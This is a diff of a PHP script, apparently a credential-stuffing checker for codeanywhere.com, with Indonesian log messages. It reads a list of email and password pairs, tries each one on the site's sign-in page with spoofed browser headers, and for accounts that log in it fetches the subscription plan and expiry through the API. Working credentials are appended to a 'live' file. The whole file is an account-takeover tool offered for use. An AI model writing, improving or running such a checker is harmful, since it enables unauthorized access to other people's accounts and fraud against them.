@@ -1,7 +1,5 @@
 <?php
 
-$no = 1;
-
 echo "List Empas : ";
 $xyz = trim(fgets(STDIN));
 echo "\n";
@@ -10,9 +8,9 @@ foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key =
 	$email = trim($pecah[0]);
 	$passwd = trim($pecah[1]);
 
-$gas = curl('https://codeanywhere.com/signin', null, null);
-$sid = ($gas[2]['sid']);
-$sails = ($gas[2]['sails_sid']);
+$mmq = curl('https://codeanywhere.com/signin', null, null);
+$sid = ($mmq[2]['sid']);
+$sails = ($mmq[2]['sails_sid']);
 
 $headers = array();
 $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
@@ -21,15 +19,25 @@ $headers[] = 'Cookie: sid='.$sid.'; sails.sid='.$sails.'; _ga=GA1.2.515752818.15
 
 $gas = curl('https://codeanywhere.com/signin', 'login_email='.$email.'&login_password='.$passwd.'', $headers);
 if (strpos($gas[1], 'Invalid login')) {
-		console::log ("[$no] [Gagal] $email | $passwd", 'red');
+		console::log ("[Gagal] $email | $passwd", 'red');
 	} else {
-        sleep(1);
-		console::log("[$no] [Success Register] $email | $passwd", 'green');
-		fwrite(fopen("codeanywhere-live.txt", "a"), "$email | $passwd \n");
+		$token = ($gas[2]['token']);
 	}
-	$no++;
 }
 
+$headers1 = array();
+$headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
+$headers1[] = 'Cookie: sid='.$sid.'; sails.sid='.$sails.'; _ga=GA1.2.515752818.1590008622; _gid=GA1.2.1441382021.1590008622; versioncode=41; token='.$token.'';
+
+$plan = curl('https://codeanywhere.com/editor', null, $headers1);
+
+$plan1 = curl('https://ca6.codeanywhere.com/api/v6/user/userData?token='.$token.'&rand=0.22768259447102934', null, null);
+		$json = json_decode($plan1[1], true);
+		$username = $json['username'];
+		$planname = $json['planname'];
+		$lastexpire = $json['last_subscription']['expire'];
+				console::log("[Success Login] $email | $passwd | Plan : $planname | Last Expire : $lastexpire", 'green');
+		fwrite(fopen("codeanywhere-live.txt", "a"), "$email | $passwd \n");
 function curl($url,$post,$headers)
 {
 	$ch = curl_init();
